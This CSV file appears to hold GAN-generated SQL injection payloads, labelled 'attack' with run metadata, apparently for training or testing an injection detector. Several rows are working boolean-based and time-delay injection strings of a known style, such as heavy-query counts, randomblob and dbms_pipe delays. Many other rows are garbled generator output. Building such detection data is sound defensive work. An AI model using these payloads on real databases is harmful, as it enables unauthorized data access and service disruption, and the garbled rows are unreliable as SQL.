label,payload,family,payload_type,method,run_id,sample_index
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1566
attack,"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""t  )   appe  (  chr(  116  )   from 3202  =  like  (  select cout  (  chr  (  69  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1567
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1568
attack,1'   )    )      )    (    and    )    and    (     (  select count  (  rcd  =  3645,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1569
attack,1  =  7182(  1041  =    (  select ch9432  )   from (  116  )   adb  (  69  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1570
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1571
attack,"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""v'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qnv',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'gockqwzqwvpwbn.s",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1572
attack,select case g,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1573
attack,"1""   )    )      )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1574
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1575
attack,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1576
attack,"1%' or 9660  =  'stablerir_systas iolldom.s as tiomas as t1,systables as guncrdb$tas sysibm.systables as t1,rdomains as t2,sysibm.sysibms  (sibm.    (  5098bm.c2i4641  =  8459  x  )   from ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1577
attack,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'p_les as tousat  (  9607    (  r 1  =  ,null  )   and   (  5098  *  )   apns rd  (  select conus t  (  *  )   and    (   ""sfnj""yppp  (  9354  =  like  (  char  (  he_110+   or 2367  =  -- and 'qjle'  =  9782 or   (  'vcgc' 8933  =  7471 as t3  )  ,0  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1578
attack,1%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1579
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1580
attack,"1'+  (  select ')',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'blosumalds as us t  (  cecemeas as t1,syps_ss as t2,syssiboes as t1,sysibm.syppes as t  (  8220  =  1 or 7417  ||8933  (  h,5000000   or    (  select count  (  *  ||comeldalll_users iomstables ge_me",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1581
attack,"1'  )   and   (  'abcdefg'(  3814  =  4297 or 8635  =    (  select count  (  9354  :  (  'abcdefg',  (  65  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1582
attack,1%'  )   and 3202  =  like  (  'abcdemesagustkblles gee_seripe.rer  (  1 +   where 79  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1583
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1584
attack,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'iepies  (  *  )   from bles age  (  chx  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1585
attack,"1%8156%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1586
attack,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'js"" like ""rrdozd'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qmas'  =  'rv"" like ""fbvqiv"" like ""ans as t1,alep_serapge  (  chr  (    65  )   from rdbmblos as colus  (  cel_users galldsusers t2,all_users as s t3  )  ,0  )   from or   (  =  9354,5  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1587
attack,"1%'  )   and 3202  =  like  (  'abcdefgan""  =  ""rdomsasigppns as ustables eris asugug',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ',5127  ,5  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1588
attack,1%2332%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1589
attack,"1'   )    )    as gep' from dual where 5309  =  5309 and 3202  =  like  (  'agexs age_ulsers 37079354,d  (  select count  )  ,5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1590
attack,"1""  )   ardbers sgatsibm.sysibm.systins t3,ables sysibm.stables sysibm.sysibm.sysibm.systain.s where 5672  =  7240",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1591
attack,"dgonall_upers as t2,all_users sysibm.systabl_users as t2,sysibm.sysibm.systbles as bypes as t3  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1592
attack,1%'bhlx'+%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1593
attack,"1""   )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1594
attack,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1595
attack,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""a'  =  '$zaz-g'   )    )     )   or 6872  =  6872 and    (    (     (  'av'   )    )    or 5903  =    (  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1596
attack,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1597
attack,"1%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  ""' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1598
attack,"select case from ge9607ifans t2,sysibm.sysib  sibm.sysag",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1599
attack,"1""   )    )    as rdbversagug',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%  =    (   select rdb$database  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1600
attack,"1""   )    )     )   or   kapeceaiveaasage_usersg",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1601
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1602
attack,"select  (  'abcdefg',4062  )   where rdb$fis as t  (  =  select and rs as t3  )   and    (     select cout  (  *  )   from ""jkfk""  =  select count  (  *  )   from   gehe  (  select cnd  (  'abcdefg',r  (  hr  (  'abcdefg',t  (  select  (  r  (  hex  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1603
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1604
attack,"1%""  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1605
attack,"-4641""epppes  (  *  )   or    (  ""ox3,.re  (  1,5000000   )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1606
attack,1'||  (  select 'xpfpj,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1607
attack,"1'+  (  select 'rxjsstablesunsgays'  =  'ystbondombcellas t4,all_users tomains as t1,s as t1,5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1608
attack,"cdialldgexp_suser.rate_s_u' from dual where 5309  =  5309 and 3202  =  like  (  'abl sysers sioobceive_serdob  (  'qqpjq'mas as t2,all_useras as uppcencoe.re_messalndbge_message  (  select 3455  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1609
attack,"1""  )   akexse' from dual where 5309  =  5309 and 3202  =  like  (  'ables sgs(klll_userieas as t  ,rsys as t4  )   and   (  3020  8459  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1610
attack,"1  )   angehx  (  rardables as t  (  r  (  h  (  3056  s  )  ,null  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1611
attack,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""zbs'  =  'ws",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1612
attack,"1""   )    )   and 5556  =  9169,3056  )   and    (       asibm.sysibm.syms_sibm.systabldsers sipipes as gen  (  chr 8635  =  8100 and all_usersibm.sysibms  (  500000000/2   ,11stabl_es iessagexe,ix  (  500000000/2   )    )    a'  =  'epre_  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1613
attack,"1'+  (  select ')   where 'qjle'  =  2494 or   a3056  (  ripr_  (  chr  (  9607  =  select 1 or 0  )   or 9643  1,5000000   (  8459  )  4212  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1614
attack,"1%'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'vs"" like ""ki'  =  'kibpesers t1,systables ms as usystabl_us  (  ceipeasers ables ases cd  (  hexsage  (  chr  (  103  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1615
attack,select 2839  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1616
attack,"-E8673' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""103  ||'qzvzq'  )   where rs goz3  )   askipe_ses es as counas sibmsibms_pe.s  (  'iv  (  *  *  *   )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1617
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1618
attack,select m  (  r )  1or 8312  =  3056+   (  69  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1619
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1620
attack,"1' in boolean mode  )   or 8384  =  like  (  'ables where rdb$cons as t3  )   from 8312  =500000000e_serrdb$fuluns t2,all_usersige_users gen    (  3175  )   ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1621
attack,select coupas rtie_sersables domb  (  500000000/2   )    )      )   and    (,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1622
attack,"1""  )   as rdbv m' like 'sage  (  select or ""%""  =  7182",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1623
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1624
attack,1%' or 1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1625
attack," 1hr aki rsibs as t2,s_p_sibm.systinsstables rs as t2,rdb$database  )  ,null  )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1626
attack,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1627
attack,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1628
attack,select count  (  *  )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1629
attack,"1%+q'  =  ''  =  'jdjj'  )   and make_set  (  4551  =  6487,6487  )   and   (  '_jj5 8156  =    (  1 or 2367  =    (  select cont  (  select case   (  65  )  or 7427  =  2839 from ellals rs ios as t3  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1630
attack,select counct  (  c,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1631
attack,"1"" and 8407  =    (  select count  (  1,5000000  )   ans t3,all_uses ge  4212  (  8220  =  2839  *  (  select celunt  (  1",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1632
attack,1   (  r  (  *  )   or 2367  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1633
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1634
attack,1'   )    )      )    )      )    )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1635
attack,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1636
attack,"1"" cs aines t1,all_users all_users like tcwqies astables 8189  =  ,null  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1637
attack,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hllt4906mbs as t2,sysibm.systables rs ables ele_s(     (    (     (     from rsysibm.sysibm.systables as  colunts as domains as t5  )  ,9432"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""   (  'xcnj'  =  select count  (  *  )   and    (   ""vfvh""  =  3645",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1638
attack,1'phpstables ssibm.sysibm.sysibmsibles as t3  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1639
attack,"1%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%8482xjkj",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1640
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1641
attack,"1%'  )   agexpes rs tables asqs g',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'qndbm)   (  select count  (  1",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1642
attack,1   )    )1--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1643
attack,1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1644
attack,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiji'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   ''  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1645
attack,"1' where  =  peries rssasibm.sysibm.sysibmsusers t3  )   and    (   5888  =  '' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1646
attack,1%'   )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1647
attack,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ez  )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1648
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1649
attack,"1%elseav68s""  =  ""s""  =  ""k'  )   or   (  2056  =  4008  )  *4008 and   (  'g)kippessqstables apt  (  crines rdbfbasis all_users as rs t2,all_userds ables astables     (  500000000  )   and   (  8641 or 8189  =    (  select cout  (  *  )   from rdombles agt  (  if1  )   from rdb$",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1650
attack,select *  )   or 9643  =    (  select colupcunuge    )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1651
attack,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1652
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1653
attack,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1654
attack,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ''  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1655
attack,"1q""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""tablables ge_mes as ustssagjijes iousustas t4,ablesysagexpredepe.receie  (  cdbmesageeivfromes t3 r from rs t2,sysib  (  500000000/2   )   from sysibm.systables as t(  cge  aus astall_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1656
attack,"1  )   where rdb$colusumteas as t3  )  ,9432  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1657
attack,1'   ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1658
attack,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  ''  =  'k_n0sg)k'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1659
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%2790%'  =  ' 8407  =  9782 or mabxs_s_blge_se(    =  1 or 5903  =  1 and   (  rerake_mesage  9354,5  )    )      (  select count  (  *  )   from as rs as t2,sysibm.satte_satras age  (  116  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1660
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1661
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1662
attack,"1%'  )   or 8384  =  like  (  'abol_users t2,sysibm.sakiesage  (  select conus  (  8220  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1663
attack,"""   )    )    or    (    (   """"   )    )     =     (    (   ""xx  ||5019  )   and    (    (   'qqpjq'||'qzvzq'  (  'abcdefg',  (  'abcdefg',upr rage  65  (  4123  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1664
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1665
attack,"dpjgzkinjsibstables astbles t5  (  select coununs t  (  riopterans generauprat  (  cries as rdbles as rdombs ass t2,all_usersibmsi' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'domblsts ab$funt  (  *  )   andb  (  select count  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1666
attack,1  )   and   abe_serdssage  (  chr  (  69  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1667
attack,1'   )    )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1668
